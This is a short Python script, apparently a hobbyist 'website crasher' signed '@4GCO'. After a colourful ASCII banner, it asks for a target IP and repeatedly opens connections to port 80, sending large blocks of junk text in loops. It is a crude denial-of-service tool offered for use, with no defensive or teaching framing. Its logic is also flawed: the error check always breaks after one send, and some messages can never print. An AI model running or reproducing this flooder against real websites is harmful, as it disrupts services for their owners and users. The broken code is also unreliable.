import socket
import os
import time
import sys
#start coding


print("\033[0;36m")

print("░░██╗██╗░██████╗░░█████╗░░█████╗░")
print("░██╔╝██║██╔════╝░██╔══██╗██╔══██╗")
print("██╔╝░██║██║░░██╗░██║░░╚═╝██║░░██║")
print("███████║██║░░╚██╗██║░░██╗██║░░██║")
print("╚════██║╚██████╔╝╚█████╔╝╚█████╔╝")
print("░░░░░╚═╝░╚═════╝░░╚════╝░░╚════╝░")

print("*********************")
time.sleep(0)

print("\033[0;34m")
print("FOLLOW ME ON INSTAGRAM @4GCO")
time.sleep(0)


print("\033[0;34m")
print("♡WELCOME TO MY WEBSITE CRASHER♡")
time.sleep(0)



print("\033[0;34m")
print("CREATED BY : @4GCO")
time.sleep(0)


print("\033[0;37m")
print("*********************")
time.sleep(1)

print("\033[1;32m")
ip=str(input("ENTER WEBSITE IP:"))
def DossWeb(ip):
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.connect((ip,80))
    a = 0
    b = 5000
    while True:
        f = a +1 * b
        data = ("iyddgoxoydxoxoxhlddlddiydiixkxkgdgkkgxlxkxgkxhlxhkxhlchlf") *f
        data = str(data).encode("utf-8")
        sock.send(data)
        print("\033[0;31m")
        print("SENDING " +ip+ "...|DONE")
        if socket.error:
            break;
            print ("[!] Faild TO CRASH [+]")
            print ("[+] Maybe Server is Dead [+]")
while True:
    os.system("clear")
    time.sleep(1)
    for data in range(100):
        DossWeb(ip)
			
